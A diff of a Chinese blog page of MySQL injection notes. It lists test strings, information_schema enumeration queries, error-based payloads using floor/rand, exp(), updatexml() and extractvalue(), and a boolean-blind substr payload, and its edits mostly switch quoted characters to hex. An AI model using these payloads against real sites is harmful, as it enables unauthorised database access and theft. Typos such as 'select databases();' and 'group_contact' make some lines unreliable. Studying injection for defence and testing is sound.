@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="sql," />
 
 
 
@@ -79,17 +79,18 @@
 
 
 
-<meta name="description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_name)">
+<meta name="description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt;&amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_n">
+<meta name="keywords" content="sql">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Sql Injection">
 <meta property="og:url" content="http://yoursite.com/2018/11/05/Sql-Injection/index.html">
 <meta property="og:site_name" content="Fxven Blog">
-<meta property="og:description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_name)">
+<meta property="og:description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt;&amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_n">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-11-07T12:10:28.653Z">
+<meta property="og:updated_time" content="2018-11-07T14:43:26.353Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Sql Injection">
-<meta name="twitter:description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_name)">
+<meta name="twitter:description" content="MySQL基本注入点 GET、POST、Headers    测试 &amp;#39;  &amp;quot;   or 1=1  and 1=2  # &amp;gt;&amp;gt; % 23  --+  基本函数1concat()、concat_ws()、group_contact() 基本语句 databases1select databases(); tables1select group_concat(table_n">
 
 
 
@@ -347,18 +348,18 @@
 
       
         <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="基本"><a href="#基本" class="headerlink" title="基本"></a>基本</h2><h3 id="注入点"><a href="#注入点" class="headerlink" title="注入点"></a>注入点</h3><p> <code>GET、POST、Headers</code>   </p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p> <code>&#39;</code>  <code>&quot;</code>   <code>or 1=1</code>  <code>and 1=2</code>  <code># &gt; % 23</code>  <code>--+</code> </p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p> <code>&#39;</code>  <code>&quot;</code>   <code>or 1=1</code>  <code>and 1=2</code>  <code># &gt;&gt; % 23</code>  <code>--+</code> </p>
 <h3 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">concat()、concat_ws()、group_contact()</span><br></pre></td></tr></table></figure>
 <h3 id="基本语句"><a href="#基本语句" class="headerlink" title="基本语句"></a>基本语句</h3><p> databases<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select databases();</span><br></pre></td></tr></table></figure></p>
 <p>tables<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(table_name) from information_schema.tables where table_schema=database();</span><br></pre></td></tr></table></figure></p>
 <p>columns<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name) from information_schema.columns where table_name=table_name;</span><br></pre></td></tr></table></figure></p>
 <p>fields<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select field_name from table_name;</span><br></pre></td></tr></table></figure></p>
 <h2 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h2><h3 id="Error-injection"><a href="#Error-injection" class="headerlink" title=" Error-injection "></a><strong> Error-injection </strong></h3><p> 对于 <code>select</code> ……<br> 对于 <code>update、insert</code>     </p>
-<p>  <strong> floor()+ count()+group by </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(&apos;#&apos;,(select database()),floor(rand()*2))a from information_schema.tables group by a) b)#</span><br></pre></td></tr></table></figure></p>
+<p>  <strong> floor()+ count()+group by </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from (select count(*),concat(0x23,(select database()),floor(rand()*2))a from information_schema.tables group by a) b)#</span><br></pre></td></tr></table></figure></p>
 <p>  <strong> exp() </strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select database() ) a) );</span><br></pre></td></tr></table></figure></p>
 <p>  <strong>bigint()</strong> (MySQL version &gt;= 5.4.45)  </p>
-<p>  <strong> updatexml() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x23,(select * from (select concat_ws(&apos;#&apos;,fileds_name) from users limit 0,1)a ) ),1)#</span><br></pre></td></tr></table></figure></p>
-<p>  <strong> extractvalue() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x23,(select * from (select concat_ws(&apos;#&apos;,fileds_name) from users limit 0,1) a) ) )#</span><br></pre></td></tr></table></figure></p>
+<p>  <strong> updatexml() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and updatexml(1,concat(0x23,(select * from (select concat_ws(0x23,fileds_name) from users limit 0,1)a ) ),1)#</span><br></pre></td></tr></table></figure></p>
+<p>  <strong> extractvalue() </strong>  (MySQL version &gt;= 5.1.5)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1,concat(0x23,(select * from (select concat_ws(0x23,fileds_name) from users limit 0,1) a) ) )#</span><br></pre></td></tr></table></figure></p>
 <h3 id="Blinds"><a href="#Blinds" class="headerlink" title="Blinds"></a><strong>Blinds</strong></h3><p>用的的函数: <code>substr()、ascii()、length()、if()、sleep()</code> </p>
 <h4 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h4><p>二分法</p>
 <h4 id="Booleanbase"><a href="#Booleanbase" class="headerlink" title="Booleanbase"></a><strong>Booleanbase</strong></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or substr((select group_concat(fileds) from table_name limit 0,1),1,1)&gt;&apos;a&apos;#</span><br></pre></td></tr></table></figure>
@@ -378,6 +379,12 @@
     
 
     <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sql/" <i class="fa fa-tag"></i> sql</a>
+          
+        </div>
       
 
       
@@ -495,7 +502,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">tags</span>
                 </a>
               </div>
